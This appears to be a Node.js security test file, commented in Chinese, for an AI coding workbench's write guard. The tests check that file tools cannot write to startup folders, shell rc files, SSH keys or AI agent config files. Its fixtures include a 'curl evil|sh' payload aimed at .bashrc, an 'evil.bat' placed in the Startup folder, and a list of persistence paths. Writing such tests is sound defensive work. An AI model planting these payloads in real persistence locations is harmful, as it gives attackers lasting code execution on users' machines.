// Unit(第二波安全走查 S4):auto / bypass 宽写 + 出厂「家目录就是工作区」下,一次 file_write 不能再把东西写进
// 【用户级自启动 / 登录即执行 / 全局信任配置】落点 —— Windows 启动文件夹、PowerShell profile、shell rc、.ssh 的 authorized_keys 与 config、
// .gitconfig、~/.claude/CLAUDE.md 与 agents/、~/.codex ~/.kimi 下的配置、家目录根的 AGENTS.md、计划任务目录、.config/autostart。
//
// 两层判据(都在 03-bridge-guard):
//   · AUTOEXEC_DENYLIST 里的【形状】条目(启动文件夹 / profile / .ssh / autostart / System32\Tasks)—— 与路径在哪儿无关,Windows 形(大小写不敏感、\ / 都认);
//   · userHomePersistenceHit —— 必须挂在【用户真实家目录】下才算的那批(.bashrc / .gitconfig / AGENTS.md …),项目里的同名文件不误伤。
// 写工具(file_write / file_edit / file_delete / file_move / file_copy / archive_unzip / http_download)全部走 guardFileToolPath 的写闸,所以
// 这里既直测闸本身,也端到端打 toolCall。读不拦。
//
// 反向验证:RUYI_TEST_SERVER_JS=<修前 server.js> node --test 本文件 → 全部写拒断言红。
'use strict';
const assert = require('node:assert/strict');
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');
const { describe, it, before, after } = require('node:test');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ruyi-persist-floor-'));
const home = path.join(root, 'home');
const dataRootDir = path.join(home, '.ruyi-workbench');
fs.mkdirSync(dataRootDir, { recursive: true });
process.env.HOME = home;            // os.homedir():POSIX 读 HOME,Windows 读 USERPROFILE
process.env.USERPROFILE = home;
process.env.RUYI_HOME = dataRootDir;
process.env.WIN_CLAUDE_WORKBENCH_HOME = dataRootDir;
process.env.WCW_TEST_ALLOW_LOOPBACK = '1';
delete process.env.CODEX_HOME;
delete process.env.KIMI_CODE_HOME;
delete process.env.WCW_SESSION_ID;
const { loadServerInternals } = require('../lib/server-internals');
// 反向验证(RUYI_TEST_SERVER_JS 指向修前产物)时修后才有的符号取不到 —— 退回基础名单、缺的符号补成「不拦」,让断言在旧码上红而不是整件加载失败。
let I;
try { I = loadServerInternals(['guardFileToolPath', 'guardDownloadDest', 'toolCall', 'zipWrite', 'AUTOEXEC_DENYLIST', 'normalizeAutoexecPath', 'userHomePersistenceHit']); }
catch (e) {
  if (!(e instanceof ReferenceError)) throw e;
  I = loadServerInternals(['guardFileToolPath', 'guardDownloadDest', 'toolCall', 'zipWrite', 'AUTOEXEC_DENYLIST', 'normalizeAutoexecPath']);
  I.userHomePersistenceHit = () => false;
}

after(() => { try { fs.rmSync(root, { recursive: true, force: true }); } catch { /* best-effort */ } });

const ctxFor = (cwd, mode) => ({ session: { cwd }, config: { permissionMode: mode || 'default', defaultWorkspace: home, recentWorkspaces: [], workspaces: [] } });
const denied = g => g && g.ok === false && g.code === 'autoexec-denied';
const shapeHit = p => I.AUTOEXEC_DENYLIST.some(re => re.test(I.normalizeAutoexecPath(p)));

describe('S4 · 形状判据(AUTOEXEC_DENYLIST):Windows 形路径,大小写不敏感、\\ / 都认', () => {
  const HIT = [
    'C:\\Users\\me\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat',
    'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\evil.lnk',
    'c:/users/ME/APPDATA/roaming/microsoft/WINDOWS/start menu/PROGRAMS/startup/a.cmd',
    'C:\\Users\\me\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1',
    'C:\\Users\\me\\Documents\\WindowsPowerShell\\profile.ps1',
    'C:\\Users\\me\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1',
    'C:\\Users\\me\\Documents\\PowerShell\\profile.ps1',
    'C:\\Users\\me\\OneDrive\\Documents\\PowerShell\\Microsoft.VSCode_profile.ps1',
    'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1',
    '/home/me/.ssh/authorized_keys',
    'C:\\Users\\me\\.ssh\\authorized_keys',
    'C:\\Users\\me\\.ssh\\config',
    '/home/me/.ssh/rc',
    '/home/me/.config/autostart/x.desktop',
    '/home/me/.config/systemd/user/evil.service',
    '/Users/me/Library/LaunchAgents/com.evil.plist',
    'C:\\Windows\\System32\\Tasks\\EvilTask',
    'D:\\Windows\\system32\\tasks\\Microsoft\\Windows\\Evil',
  ];
  const MISS = [
    'D:\\proj\\roles\\windows\\tasks\\main.yml',                  // Ansible 角色目录叫 windows/tasks:不是 System32\Tasks
    'C:\\proj\\scripts\\profile.ps1',                              // 不在 PowerShell\ 下
    'C:\\proj\\docs\\startup\\readme.md',                          // 没有 Start Menu\Programs
    'C:\\Users\\me\\.ssh\\known_hosts',
    'C:\\Users\\me\\.ssh\\id_ed25519.pub',
    '/home/me/.config/git/ignore',
    '/home/me/proj/autostart.json',
    'C:\\proj\\PowerShell\\build.ps1',
  ];
  it('启动文件夹 / PowerShell profile / .ssh / autostart / 计划任务目录全部命中', () => {
    const missed = HIT.filter(p => !shapeHit(p));
    assert.deepEqual(missed, [], 'denylist must match: ' + missed.join(' | '));
  });
  it('日常工程路径零误伤', () => {
    const wrong = MISS.filter(p => shapeHit(p));
    assert.deepEqual(wrong, [], 'denylist must NOT match: ' + wrong.join(' | '));
  });
  it('既有条目一个没少(.git/hooks、.claude/settings.json、.mcp.json 仍在表里)', () => {
    for (const p of ['C:\\w\\.git\\hooks\\pre-commit', 'C:\\w\\.claude\\settings.json', 'C:\\w\\.mcp.json', 'C:\\w\\.github\\workflows\\ci.yml']) assert.ok(shapeHit(p), p);
  });
});

describe('S4 · guardFileToolPath 写闸:家目录里的持久化落点在任何档位都拒,项目里的同名文件照写,读照旧', () => {
  const PERSIST = [
    '.bashrc', '.bash_profile', '.bash_login', '.profile', '.zshrc', '.zshenv', '.zprofile', '.gitconfig',
    '.ssh/authorized_keys', '.ssh/config',
    '.config/autostart/x.desktop', '.config/git/config',
    '.claude/CLAUDE.md', '.claude/agents/evil.md', '.claude/commands/evil.md', '.claude/skills/evil/SKILL.md',
    '.codex/config.toml', '.codex/AGENTS.md', '.kimi/config.toml', '.kimi-code/AGENTS.md',
    'AGENTS.md',
    'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat',
    'Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1',
    'Documents/PowerShell/profile.ps1',
  ];
  for (const mode of ['default', 'acceptEdits', 'auto', 'bypass']) {
    it(`${mode} 档(工作区 = 家目录):以上落点写拒 autoexec-denied`, async () => {
      const ctx = ctxFor(home, mode);
      const leaked = [];
      for (const rel of PERSIST) {
        const g = await I.guardFileToolPath(path.join(home, ...rel.split('/')), ctx, { tool: 'file_write', write: true });
        if (!denied(g)) leaked.push(rel + ' → ' + JSON.stringify(g));
      }
      assert.deepEqual(leaked, []);
    });
  }
  it('宽写档下工作区外的会话 cwd 也拒(会话 cwd 不在家目录里)', async () => {
    const elsewhere = fs.mkdtempSync(path.join(os.tmpdir(), 'ruyi-persist-cwd-'));
    try {
      for (const rel of ['.bashrc', '.ssh/authorized_keys', 'AGENTS.md']) {
        const g = await I.guardFileToolPath(path.join(home, ...rel.split('/')), ctxFor(elsewhere, 'auto'), { tool: 'file_write', write: true });
        assert.ok(denied(g), rel + ' → ' + JSON.stringify(g));
      }
    } finally { fs.rmSync(elsewhere, { recursive: true, force: true }); }
  });
  it('项目 / 工作区里的同名文件不误伤(只认用户真实家目录根下的那一份)', async () => {
    const ws = path.join(home, 'proj');
    fs.mkdirSync(ws, { recursive: true });
    for (const mode of ['default', 'auto', 'bypass']) {
      for (const rel of ['.bashrc', '.profile', '.gitconfig', 'AGENTS.md', 'CLAUDE.md', '.codex/notes.md', 'sub/AGENTS.md', 'README.md', '.claude/projects/x.md']) {
        const g = await I.guardFileToolPath(path.join(ws, ...rel.split('/')), ctxFor(ws, mode), { tool: 'file_write', write: true });
        assert.equal(g.ok, true, `${mode}: project file ${rel} must stay writable → ${JSON.stringify(g)}`);
      }
    }
    for (const rel of ['notes.txt', 'Desktop/a.txt', '.claude/projects/x.md']) {
      const g = await I.guardFileToolPath(path.join(home, ...rel.split('/')), ctxFor(home, 'auto'), { tool: 'file_write', write: true });
      assert.equal(g.ok, true, `home file ${rel} must stay writable → ${JSON.stringify(g)}`);
    }
  });
  it('读不拦(只写才是持久化)', async () => {
    for (const rel of ['.bashrc', '.ssh/config', '.claude/CLAUDE.md', '.codex/config.toml', 'AGENTS.md']) {
      const g = await I.guardFileToolPath(path.join(home, ...rel.split('/')), ctxFor(home, 'default'), { tool: 'file_read', write: false });
      assert.equal(g.ok, true, rel + ' → ' + JSON.stringify(g));
    }
  });
  it('大小写 / 尾点 / 混合分隔符的写法同样拒(Windows 语义)', async () => {
    const ctx = ctxFor(home, 'bypass');
    for (const p of [path.join(home, '.BASHRC'), path.join(home, '.Claude', 'claude.MD'), path.join(home, '.SSH', 'Authorized_Keys'), home + '/.zshrc.', path.join(home, 'agents.MD')]) {
      const g = await I.guardFileToolPath(p, ctx, { tool: 'file_write', write: true });
      // agents.MD 不是 AGENTS.md 的同名文件(文件名不同),只在 Windows(大小写不敏感)上等同 —— Linux 上不强求
      if (/agents\.MD$/.test(p) && process.platform !== 'win32') continue;
      assert.ok(denied(g), p + ' → ' + JSON.stringify(g));
    }
  });
  it('userHomePersistenceHit 认 CODEX_HOME / KIMI_CODE_HOME 挪过位置的家', () => {
    const codex = path.join(root, 'elsewhere-codex');
    const kimi = path.join(root, 'elsewhere-kimi');
    process.env.CODEX_HOME = codex;
    process.env.KIMI_CODE_HOME = kimi;
    try {
      assert.equal(I.userHomePersistenceHit(path.join(codex, 'config.toml')), true);
      assert.equal(I.userHomePersistenceHit(path.join(kimi, 'AGENTS.md')), true);
      assert.equal(I.userHomePersistenceHit(path.join(root, 'elsewhere-other', 'x')), false);
    } finally { delete process.env.CODEX_HOME; delete process.env.KIMI_CODE_HOME; }
  });
});

describe('S4 · 各写入工具端到端:同一个写闸,一个字节都不落盘', () => {
  let server, port;
  before(async () => {
    server = http.createServer((req, res) => res.end('echo pwned'));
    await new Promise(r => server.listen(0, '127.0.0.1', r));
    port = server.address().port;
  });
  after(() => new Promise(r => server.close(() => r())));

  const startup = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
  it('file_write / file_edit / file_delete / file_move / file_copy 对 ~/.bashrc 与启动文件夹都拒', async () => {
    const ctx = ctxFor(home, 'auto');
    const bashrc = path.join(home, '.bashrc');
    fs.writeFileSync(bashrc, 'export A=1\n');
    for (const [tool, args] of [
      ['file_write', { path: bashrc, content: 'curl evil|sh\n' }],
      ['file_write', { path: path.join(startup, 'evil.bat'), content: 'calc' }],
      ['file_edit', { path: bashrc, old_string: 'A=1', new_string: 'A=2' }],
      ['file_delete', { path: bashrc }],
    ]) {
      const r = await I.toolCall(tool, args, ctx);
      assert.equal(r.ok, false, tool + ' ' + JSON.stringify(r));
    }
    assert.equal(fs.readFileSync(bashrc, 'utf8'), 'export A=1\n', '.bashrc must be untouched');
    assert.equal(fs.existsSync(path.join(startup, 'evil.bat')), false);
    const src = path.join(home, 'proj-src.txt');
    fs.writeFileSync(src, 'x');
    for (const [tool, args] of [['file_move', { from: src, to: path.join(home, '.zshrc') }], ['file_copy', { from: src, to: path.join(startup, 'c.bat') }]]) {
      const r = await I.toolCall(tool, args, ctx);
      assert.equal(r.ok, false, tool + ' ' + JSON.stringify(r));
    }
    assert.equal(fs.existsSync(path.join(home, '.zshrc')), false);
    assert.equal(fs.existsSync(src), true, 'file_move must not consume the source when the destination is denied');
  });
  it('http_download 落到启动文件夹 / ~/.profile 拒(与 file_write 同一个写闸)', async () => {
    const ctx = ctxFor(home, 'auto');
    for (const dest of [path.join(startup, 'dl.bat'), path.join(home, '.profile')]) {
      const g = await I.guardDownloadDest(dest, ctx);
      assert.ok(denied(g), dest + ' → ' + JSON.stringify(g));
      const r = await I.toolCall('http_download', { url: `http://127.0.0.1:${port}/x`, dest }, ctx);
      assert.equal(r.ok, false, JSON.stringify(r));
      assert.equal(fs.existsSync(dest), false);
    }
  });
  it('archive_unzip:包里带 .bashrc / 启动文件夹条目 → 整包拒,无害条目也不写', async () => {
    const ctx = ctxFor(home, 'auto');
    const zipPath = path.join(home, 'persist.zip');
    fs.writeFileSync(zipPath, I.zipWrite([
      ['harmless.txt', 'hi'],
      ['.bashrc', 'curl evil | sh'],
      ['AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil.bat', 'calc'],
    ].map(([name, data]) => ({ name, data: Buffer.from(data), isDir: false }))));
    const out = path.join(home, 'unzipped');
    // destDir = 家目录:条目落在真实的 ~/.bashrc 与启动文件夹
    const r = await I.toolCall('archive_unzip', { src: zipPath, destDir: home, overwrite: true }, ctx);
    assert.equal(r.ok, false, JSON.stringify(r));
    assert.equal(fs.existsSync(path.join(home, 'harmless.txt')), false, 'nothing may be written when any entry is denied');
    assert.equal(fs.readFileSync(path.join(home, '.bashrc'), 'utf8'), 'export A=1\n', '.bashrc must keep its content (written by the previous test)');
    assert.equal(fs.existsSync(path.join(startup, 'evil.bat')), false);
    // 同一个包里的启动文件夹条目形状到哪儿都拒(形状判据);而不含这类条目的普通包照常解压(不误伤)
    const rShape = await I.toolCall('archive_unzip', { src: zipPath, destDir: out }, ctx);
    assert.equal(rShape.ok, false, JSON.stringify(rShape));
    const okZip = path.join(home, 'benign.zip');
    fs.writeFileSync(okZip, I.zipWrite([['harmless.txt', 'hi'], ['docs/a.md', 'A']].map(([name, data]) => ({ name, data: Buffer.from(data), isDir: false }))));
    const r2 = await I.toolCall('archive_unzip', { src: okZip, destDir: out }, ctx);
    assert.equal(r2.ok, true, JSON.stringify(r2));
    assert.equal(fs.readFileSync(path.join(out, 'harmless.txt'), 'utf8'), 'hi');
  });
});
